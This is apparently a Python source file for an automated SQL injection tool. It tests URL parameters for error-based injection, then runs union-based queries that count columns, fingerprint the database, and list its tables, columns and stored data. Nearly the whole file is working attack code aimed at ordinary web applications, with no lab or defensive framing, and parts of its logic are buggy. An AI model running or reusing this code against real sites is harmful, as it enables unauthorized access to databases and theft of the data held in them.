import os.path
import re
from sys import platform
from urllib.parse import urlparse

import requests
from bs4 import BeautifulSoup

file_path = os.path.dirname(__file__)

reserved_words = ['TestSQLinj', 'union', 'select', 'table_name=', 'information_schema.tables--', 'null', 'FROM',
                  'WHERE', 'column_name', 'information_schema.columns']

cleaner_regex = re.compile('.*\|\|.*||@||.*\'.*||.*null.*||.*--.*')


# Helper function to remove the tags from response
# Function to remove tags
def remove_tags(html):
    # parse html content
    soup = BeautifulSoup(html.text, "html.parser")
    for data in soup(['style', 'script']):
        # Remove tags
        data.decompose()
    # return data by retrieving the tag content
    return ' '.join(soup.stripped_strings)


# to determine the column(s) with string as data type
# function used in: step(b-1)
def figure_sting_columns(url, num_col):
    for i in range(1, num_col + 1):
        test_string = "'TestSQLinj'"
        payload_list = ['null'] * num_col
        payload_list[i - 1] = test_string
        sql_payload = "' union select " + ','.join(payload_list) + "-- -"
        sql_payload_oracle = "' union select " + ','.join(payload_list) + " from dual" + "-- -"
        res = requests.get(url + sql_payload).text
        res_oracle = requests.get(url + sql_payload_oracle).text
        if test_string.strip('\'') in res:
            return i, sql_payload
        elif test_string.strip('\'') in res_oracle:
            isOracle = True
            return i, sql_payload_oracle
    return False


# return DB type and version
def figure_DB_version(url, sql_payload):
    isOracle = False
    res_before = requests.get(url)
    # Info for Detection for MsSQL , MYSQL
    inj_query = str(sql_payload).replace('\'TestSQLinj\'', '@@version')
    inj_url = url + inj_query
    res_after = requests.get(inj_url)

    # Info for Detection for PostgreSQL
    inj_query_PostgreSQL = str(sql_payload).replace('\'TestSQLinj\'', 'version()')
    inj_url_PostgreSQL = url + inj_query_PostgreSQL
    res_after_PostgreSQL = requests.get(inj_url_PostgreSQL)

    if res_after.status_code == 200:
        cleand_after_res = str(remove_tags(res_after))
        databases_version = re.search("[0-9].*ubuntu[0-9].*|MySQL.*[0-9]|SQL.*[1-9].*", cleand_after_res)
        return databases_version, isOracle

    elif res_after_PostgreSQL.status_code == 200:
        cleand_after_res_PostgreSQL = str(remove_tags(res_after_PostgreSQL))
        databases_version = re.search("PostgreSQL [0-9].*[0-9]", cleand_after_res_PostgreSQL)
        return databases_version, isOracle

    else:
        isOracle = True
        inj_query_Oracle = str(sql_payload).replace('\'TestSQLinj\'', 'banner').replace('from dual-- -', 'FROM v$version -- -')
        inj_url_Oracle = url + inj_query_Oracle
        res_after_Oracle = requests.get(inj_url_Oracle)
        cleand_after_res_oracle = str(remove_tags(res_after_Oracle))
        databases_version = re.search("Oracle Database [0-9].*[0-9]", cleand_after_res_oracle)
        return databases_version, isOracle


# return list of tables in DB
# function used in: step(a-2)
def figure_tables_in_DB(url, sql_payload, isOracle):
    if isOracle:
        res_before_oracle = requests.get(url)
        inj_tables_schema = str(sql_payload).replace('from dual-- -', 'from all_tables-- -')
        inj_query_Oracle = str(inj_tables_schema).replace('\'TestSQLinj\'', 'table_name')
        inj_url_Oracle = url + inj_query_Oracle
        res_after_Oracle = requests.get(inj_url_Oracle)
        cleand_after_res = remove_tags(res_after_Oracle).split()
        cleand_before_res = remove_tags(res_before_oracle).split()
        diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
        new_diff_in_responses = []
        for i in diff_in_responses:
            if i not in reserved_words:
                cleantext = re.sub(cleaner_regex, '', i)
                if cleantext != '':
                    new_diff_in_responses.append(cleantext)
        return new_diff_in_responses

    else:
        res_before = requests.get(url)
        inj_query = str(sql_payload).replace('\'TestSQLinj\'', 'table_name').strip(
            '-- -') + ' FROM information_schema.tables-- -'
        inj_url = url + inj_query
        res_after = requests.get(inj_url)
        cleand_after_res = remove_tags(res_after).split()
        cleand_before_res = remove_tags(res_before).split()
        diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
        new_diff_in_responses = []
        for i in diff_in_responses:
            if i not in reserved_words:
                cleantext = re.sub(cleaner_regex, '', i)
                if cleantext != '':
                    new_diff_in_responses.append(cleantext)
        return new_diff_in_responses


# return list of columns in specific table
# function used in: step(b-2)
def figure_columns_in_table(url, sql_payload, table_name, isOracle):
    if isOracle:
        res_before = requests.get(url)
        extract_query = ' FROM all_tab_columns WHERE table_name=\'{}\'-- -'.format(table_name)
        inj_query_schema = str(sql_payload).replace('from dual', '')
        inj_query = str(inj_query_schema).replace('\'TestSQLinj\'', 'column_name').strip('-- -') + extract_query
        inj_url = url + inj_query
        res_after = requests.get(inj_url)
        cleand_after_res = remove_tags(res_after).split()
        cleand_before_res = remove_tags(res_before).split()
        diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
        reserved_words.append('\'{}\'--'.format(table_name))
        reserved_words.append('table_name=\'{}\'-- -'.format(table_name))
        new_diff_in_responses = []
        for i in diff_in_responses:
            if i not in reserved_words:
                cleantext = re.sub(cleaner_regex, '', i)
                if cleantext != '':
                    new_diff_in_responses.append(cleantext)
        return new_diff_in_responses
    else:
        res_before = requests.get(url)
        extract_query = ' FROM information_schema.columns WHERE table_name=\'{}\'-- -'.format(table_name)
        inj_query = str(sql_payload).replace('\'TestSQLinj\'', 'column_name').strip('-- -') + extract_query
        inj_url = url + inj_query
        res_after = requests.get(inj_url)
        cleand_after_res = remove_tags(res_after).split()
        cleand_before_res = remove_tags(res_before).split()
        diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
        reserved_words.append('\'{}\'--'.format(table_name))
        reserved_words.append('table_name=\'{}\'-- -'.format(table_name))
        new_diff_in_responses = []
        for i in diff_in_responses:
            if i not in reserved_words:
                cleantext = re.sub(cleaner_regex, '', i)
                if cleantext != '':
                    new_diff_in_responses.append(cleantext)
        return new_diff_in_responses


# return data in selected columns
# function used in: step(c-2)
def figure_data_in_columns(url, sql_payload, table_name, column_name):
    res_before = requests.get(url)
    inj_query = str(sql_payload).strip('-- -')
    inj_query = str(inj_query).replace(' from dual', '')
    extract_query = ' FROM {}-- -'.format(table_name)
    inj_query_1 = str(inj_query).replace('\'TestSQLinj\'', column_name)
    inj_query_2 = inj_query_1 + extract_query
    inj_url = url + inj_query_2
    print(inj_url)
    res_after = requests.get(inj_url)
    cleand_after_res = remove_tags(res_after).split()
    cleand_before_res = remove_tags(res_before).split()
    diff_in_responses = set(cleand_after_res).symmetric_difference(set(cleand_before_res))
    print("Ur data is here: ")
    new_diff_in_responses = []
    for i in diff_in_responses:
        if i not in reserved_words:
            cleantext = re.sub(cleaner_regex, '', i)
            if cleantext != '':
                new_diff_in_responses.append(cleantext)
    return new_diff_in_responses
    for i in new_diff_in_responses:
        print(i)



# Our main work depend on fn called UnionExploitation :
# his work can divided into TWO Main steps

# 1st Step "Discovery Step":
# a- it determined the number of columns by using 'ORDER BY' Clause
# b- after this we will try to find column(s) that has 'string' as data type to extract data by it.
# we are doing step(b) by calling function called -->figure_sting_columns<--

# 2nd Step "Access Step" :
# a- we want to know the tables in this DB we perform that by calling -->figure_tables_in_DB<--
# b- the user will select the table(s) what he wanted to know its column(s)
# we are doing step(b) by calling -->figure_columns_in_table<--
# c- NOW "ACTUAL" access step by figure out data in the selecting column(s) by user
# we are doing step(c) by calling -->figure_data_in_columns<--


#         <-- MAIN FUNCTION -->
def UnionExploitation(url, error_massage):
    output_exploition = []
    tables = []
    # this is (a-1) step it determined the number of columns using 'ORDER BY' Clause
    print("[*] Figure out number of columns ...")
    output_exploition.append(f"[*] Figure out number of columns ...")
    columns_no = 0
    for i in range(1, 100):
        sql_inj = "'+order+by+{}--+-".format(i)
        inj_url = url + sql_inj
        response = requests.get(inj_url)
        error_pattern = re.compile(error_massage)
        if error_pattern.search(response.text):
            columns_no = i - 1
            break
        i += 1

    # if we can find the number of columns we will go to (b-1) step
    # Trying to find the column(s) that has(have) string as its datatype
    # this step considered as FUNDAMENTAL Step if we can find at least one column
    # with string as datatype, we can extract data from tables easily
    if columns_no:
        print("[+] we have {} columns".format(columns_no))
        output_exploition.append(f"[+] we have {columns_no} columns")
        string_column, sql_payload = figure_sting_columns(url, columns_no)
        if string_column:
            print("[+] column {} it's data type is string, verify by payload: {}".format(string_column, sql_payload))
            output_exploition.append(f"[+] column {string_column} it's data type is string, verify by payload: {sql_payload}")
            # figure out DB version
            DB_version, isOracle = figure_DB_version(url, sql_payload)
            if DB_version is not None:
                print("[+] your DB version : {} ".format(DB_version.group(0)))
                output_exploition.append(f"[+] your DB version : {DB_version.group(0)}")
            else:
                print("[-] Can't detect DB version")
                output_exploition.append(f"[-] Can't detect DB version")

            # now we started the funny part of this process by starting enumerate data in DB
            # now at (a-2) step we will enumerate tables that exist in this DB

            # Tables start here
            DB_tables = figure_tables_in_DB(url, sql_payload, isOracle)
            no_tables = len(DB_tables)
            print("[+] Exploiting {} tables".format(
                no_tables))

            output_exploition.append(
                f"[+] Exploiting {no_tables} tables")
            tables += DB_tables

            for i in DB_tables:
                print("#{}: {}".format(list(DB_tables).index(i), i))

            ## attack Tables start from here
            # table_name = input("Insert table name: ")
            # if table_name not in DB_tables:
            #     print("[X] This table is not exist!")

            # now at step (b-2) and we have the name of table that the user want to enumerate its columns
            #     DB_columns = UnionScripts.figure_columns_in_table(url, sql_payload, table_name, isOracle)
            #     print("[+] Exploiting {} columns, this is names of this columns, insert one to show his data".format(
            #         len(DB_columns)))
            #     for i in DB_columns:
            #         print("#{}: {}".format(list(DB_columns).index(i), i))
            #     column_name = input("Insert column: ")
            #     if column_name not in DB_columns:
            #         print("[X] This table is not exist!")
            #     else:
            #         flag = input(" to insert another column 1 or 0 to exit: ")
            #         while flag == '1':
            #             column = input("insert another column: ")
            #             if column not in DB_columns:
            #                 print("[X] This table is not exist!")
            #             column_name = column_name + '|| \' @ \' ||' + column
            #             flag = input("to insert another column 1 or 0 to exit: ")
            #
            #         # FINALLY, at last step (c-2) step in this step all data within selected tables and columns
            #         # we displayed on user's screen
            #         UnionScripts.figure_data_in_columns(url, sql_payload, table_name, column_name)
        else:
            print("[-] There is no exist columns has string as data type")
    else:
        print("[-] Can't find columns number")
        output_exploition.append("[-] Can't find columns number")
    return output_exploition, tables, sql_payload, isOracle



if platform == "linux" or platform == "linux2":
    with open(fr'{file_path}/Error-regexs/MySQL_Error.txt', 'r') as Mysql_Errors:
        Mysql_Error = Mysql_Errors.readlines()
    with open(fr'{file_path}/Error-regexs/Oracle_Error.txt', 'r') as Oracle_Errors:
        Oracle_Error = Oracle_Errors.readlines()
    with open(fr'{file_path}/Error-regexs/PostgreSQL_Error.txt', 'r') as PostgreSQL_Errors:
        PostgreSQL_Error = PostgreSQL_Errors.readlines()
    with open(fr'{file_path}/Error-regexs/MsSQL_Error.txt', 'r') as MS_Errors:
        MS_Error = MS_Errors.readlines()
else:
    with open(fr'{file_path}\Error-regexs\MySQL_Error.txt', 'r') as Mysql_Errors:
        Mysql_Error = Mysql_Errors.readlines()
    with open(fr'{file_path}\Error-regexs\Oracle_Error.txt', 'r') as Oracle_Errors:
        Oracle_Error = Oracle_Errors.readlines()
    with open(fr'{file_path}\Error-regexs\PostgreSQL_Error.txt', 'r') as PostgreSQL_Errors:
        PostgreSQL_Error = PostgreSQL_Errors.readlines()
    with open(fr'{file_path}\Error-regexs\MsSQL_Error.txt', 'r') as MS_Errors:
        MS_Error = MS_Errors.readlines()

DB_errors = [Mysql_Error, Oracle_Error, PostgreSQL_Error, MS_Error]


def exploit_sqli(url, payload, param):
    param += payload
    injection_url = urlparse(url).scheme + "://" + urlparse(url).netloc + urlparse(url).path + "?" + param
    response = requests.get(injection_url)
    for i in range(len(DB_errors)):
        for massage in DB_errors[i]:
            massage = massage.strip()
            pattern = re.compile(massage)
            if pattern.search(response.text):
                return True, massage
            else:
                return False


def sample_Get_inj(url):
    outputs_get_inj = []
    tables = []
    outputs_of_union_based_attack = []
    params = urlparse(url).query.split("&")
    print("[*] Test Error based injection")
    outputs_get_inj.append("[*] Test Error based injection")
    for param in params:
        print("[*] Test Parameter: {}".format(param))
        outputs_get_inj.append(f"[*] Test Parameter: {param}")
        with open(fr'{file_path}/Error-regexs/Error-based-payloads.txt', 'r') as payload_list:
            for payload in payload_list:
                payload = payload.strip()
                injected, massage = exploit_sqli(url, payload, param)
                if injected:
                    print("[+] SQL injection is Founded, using payload: {} ".format(payload))
                    outputs_get_inj.append(f"[+] SQL injection is Founded, using payload: {payload}")
                    out, tables, pay, oracle = UnionExploitation(url, massage)
                    outputs_get_inj += out
                    break

    return outputs_get_inj, tables, pay, oracle


